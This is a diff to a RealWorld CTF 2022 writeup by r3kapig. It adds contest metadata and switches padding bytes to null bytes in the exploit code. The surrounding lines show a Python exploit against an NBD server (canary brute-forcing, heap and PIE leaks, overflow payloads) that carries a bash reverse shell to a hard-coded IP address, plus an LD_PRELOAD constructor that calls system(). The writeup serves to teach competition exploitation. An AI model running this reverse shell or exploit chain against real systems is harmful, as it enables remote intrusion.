@@ -79,6 +79,9 @@ prerequisites:
 - ql_qiling 用户态模拟框架
 - NBD 网络块设备协议
 - Java AnnotationProcessor 编译机制
+contest_normalized: "RealWorld CTF"
+contest_year: 2022
+subcategory_guess: "rce"
 ---
 # RealWorld CTF 4th Writeup by r3kapig
 
@@ -423,7 +426,7 @@ def NBD_OPT_INFO(buf):
     sn(buf)
     p.read()
     pad = b" "*0x10+b'''sleep 3;bash -c 'exec bash -i &>/dev/tcp/49.234.220.122/20191 <&1';'''*0x6
-    sn(pad.ljust(len(buf)+4,b' '))
+    sn(pad.ljust(len(buf)+4,b'\\x00'))
     sn(p16(0,endian='big'))
     p.readuntil("nown")
 def single_req(base,guess):
@@ -453,24 +456,24 @@ except:
                 continue
         if(not flag):
             return 0
-        log.warning(hex(u64(res.ljust(8,b' '))))
-    res = u64(res.ljust(8,b' '))
+        log.warning(hex(u64(res.ljust(8,b'\\x00'))))
+    res = u64(res.ljust(8,b'\\x00'))
     log.warning(hex(res))
     input()
     return res
 def canary():
-    base=b"A"*(0x408)+b' '
+    base=b"A"*(0x408)+b'\\x00'
     length=7
     return req(base,length)
 def leak_heap():
     global p
 
-    base = b"A"*(0x408)+ p64(canary_val) +b" "*0x18
+    base = b"A"*(0x408)+ p64(canary_val) +b"\\x00"*0x18
     length = 6
     return req(base,length)
 def leak_pie():
     global p
-    base = b"A"*(0x408)+ p64(canary_val) +b" "*0x18
+    base = b"A"*(0x408)+ p64(canary_val) +b"\\x00"*0x18
     base+= p64(heap)+p64(0)+p64(heap-0x100)+p64(0)+b"xea"
     length= 5
     return req(base,length)
@@ -479,7 +482,7 @@ def exploit(c):
     p = remote(ip,port)
     sa("OPTx00x03",p32(0))
     sn(p64(0x54504f4556414849))
-    pay = b"A"*(0x408)+p64(canary_val)+b" "*0x18
+    pay = b"A"*(0x408)+p64(canary_val)+b"\\x00"*0x18
     pay += p64(heap)+p64(0)+p64(heap-0x100)+p64(0)+c
     NBD_OPT_INFO(pay)
     p.interactive()
@@ -685,7 +688,7 @@ __attribute__ ((__constructor__)) void preload (void)
     int i;
     for (i = 0; environ[i]; ++i) {
             if (strstr(environ[i], "LD_PRELOAD")) {
-                    environ[i][0] = ' ';
+                    environ[i][0] = '\\x00';
             }
     }
     system(cmdline);
